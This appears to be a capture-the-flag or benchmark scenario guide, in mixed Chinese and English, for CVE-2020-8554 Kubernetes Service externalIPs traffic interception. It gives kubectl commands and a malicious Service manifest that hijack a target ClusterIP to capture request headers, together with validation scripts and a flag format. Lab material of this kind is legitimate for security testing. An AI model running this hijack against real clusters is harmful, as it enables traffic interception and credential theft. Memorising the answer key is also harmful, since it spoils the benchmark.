# K8S-22: Service ExternalIP Traffic Interception

## 场景信息

| 字段 | 值 |
|---|---|
| ID | K8S-22 |
| 名称 | Service ExternalIP Traffic Interception |
| 技术/CVE | CVE-2020-8554 |
| 难度 | L3 |
| 交付方式 | KIND / Kubernetes |
| 入口 | KIND 集群内入口（无固定宿主端口） |
| 入口身份 | sa-token attack-ns/attacker-sa |
| 终点 | 受害者客户端请求头 X-Flag（被 externalIPs 改道截获） |

## 场景概述

```
Attacker pod (attack-ns) → Discover target service ClusterIP
  → Create malicious Service with externalIPs = target ClusterIP
  → All traffic to target IP routes to attacker pods
  → Capture flag-bearing X-Flag requests
```

## 前置知识

- kubectl access to KIND cluster `cve-k8s-22-externalip`
- 可创建带 `externalIPs` 的 Service；目标 Service 流量经 ClusterIP 路由

## 利用步骤

### Step 1: Discover Target Service

```bash
kubectl get svc --all-namespaces
# Note: internal-api in secure-ns with ClusterIP <TARGET_IP>
TARGET_IP=$(kubectl get svc internal-api -n secure-ns -o jsonpath='{.spec.clusterIP}')
```

### Step 2: Create Malicious Service with ExternalIPs

```bash
kubectl apply -f - << EOF
apiVersion: v1
kind: Service
metadata:
  name: hijack-svc
  namespace: attack-ns
spec:
  externalIPs:
    - $TARGET_IP
  selector:
    app: null  # won't match anything, or match attacker pods
  ports:
    - port: 8080
      targetPort: 8080
EOF
```

### Step 3: Capture Intercepted Traffic

```bash
# From attacker pod, listen for redirected traffic
# The attacker pod runs a netcat loop that logs every captured request
kubectl exec -n attack-ns attacker-pod -- cat /tmp/captured_requests.txt
```

### Step 4: Read Flag from Intercepted Data

```bash
# The flag is carried in the X-Flag header of requests sent by the flag-client
kubectl exec -n attack-ns attacker-pod -- grep -o 'X-Flag: [^ ]*' /tmp/captured_requests.txt
```

## 验证命令

```bash
cd cve_challenges/scenarios/k8s/externalip-hijack && bash deploy.sh
# 1. kubectl exec -n attack-ns attacker-pod -- cat /tmp/captured_requests.txt
# 2. grep X-Flag from the captured requests
bash teardown.sh
```

## Flag

- 位置：受害者客户端请求头 X-Flag（被 externalIPs 改道截获）。
- 注入：验收侧用 `CVE_FLAG` 显式传入（多 flag 场景用 `CVE_FLAG1..N`），部署时写进节点
  （root-only 0600）或集群内 Secret/ConfigMap，宿主不留副本。
- 形态：`flag{k8s-22-<16 位十六进制>}`。
- 验收：`bash scripts/validate-k8s-gate.sh k8s-22 <agent-kubeconfig> <flag> <cluster>`（gate）+
  `bash tests/k8s/run.sh k8s-22 <agent-kubeconfig> <flag> <cluster>`（参考利用）。

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | Kubernetes Services, ExternalIP, and network routing |
| 侦察与前置条件 | Service ExternalIP acceptance and victim traffic target |
| 核心漏洞与利用 | Claim an ExternalIP to intercept service traffic |
| 权限、横向或影响 | Network traffic hijacking and credential/data capture |
| 验证 | Inspect intercepted traffic for the flag |

## 修复建议

升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
